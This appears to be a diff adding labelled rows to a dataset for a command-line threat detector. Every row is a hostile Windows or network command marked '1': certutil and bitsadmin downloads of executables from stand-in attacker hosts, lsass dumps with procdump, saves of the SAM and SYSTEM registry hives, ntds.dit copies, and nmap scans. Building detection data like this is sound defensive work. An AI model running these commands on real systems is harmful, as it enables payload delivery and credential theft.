+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.122.31,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.193.10,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.33.61,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -p- 192.168.231.176,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.213.144,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.69.209/24,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.90.13,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.99.89/24,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -p- 192.168.188.4,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.224.249,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.49.70,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.101.11/24,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.49.2",1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.43.185,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.173.245,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.238.12",1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.119.198,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.106.246,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.79.61/24,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.186.169,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.27.96,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.172.187,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.203.202,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.7.88,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.55.3,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.17.13,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.78.212,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.75.217/24,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.120.27,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.66.165/24,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.126.221",1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.37.241",1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.110.35,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.8.61,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.164.58,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.32.142,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.238.70",1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.66.11/24,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.169.252,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.203.138",1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.247.52/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.205.93,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.190.238,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.244.188",1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.50.85/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.134.123,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.213.179,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.121.110,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.187.169,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.169.38,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.132.41,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.203.243,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -p- 192.168.124.182,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.236.159,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -p- 192.168.97.251,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.96.249,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.49.210,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.201.140,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.119.214,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.100.4,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -p- 192.168.116.7,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.4.135,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.143.214/24,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.35.170,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.213.204,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.226.197,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -p- 192.168.61.217,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.168.158,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.61.46/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.36.196,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.130.137/24,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.157.126/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.255.60,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -p- 192.168.104.183,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.172.246,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -p- 192.168.209.2,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.86.33,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.28.231,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.144.195,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.105.7/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.111.85,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.140.96,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.32.43,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.150.65,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.133.240,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.229.164,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.245.84",1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.53.162,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.29.19,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.97.192,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.228.131,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.10.134/24,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.157.167,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.59.127,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.120.127,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.218.125",1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.179.171,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.79.97,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.166.80,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.234.22,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -p- 192.168.217.69,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.39.28,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.197.62/24,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.117.64",1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.185.175,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.186.184,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.253.254,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.42.197,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.61.180",1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.235.183,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.194.68,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.202.249,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.82.187,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.124.64,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.50.139/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.56.191/24,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.252.137/24,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.214.36/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.189.121",1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.252.184",1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.167.102,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.100.88/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.210.60",1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.221.169,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.165.73/24,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.77.248",1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.175.109/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.22.73,1
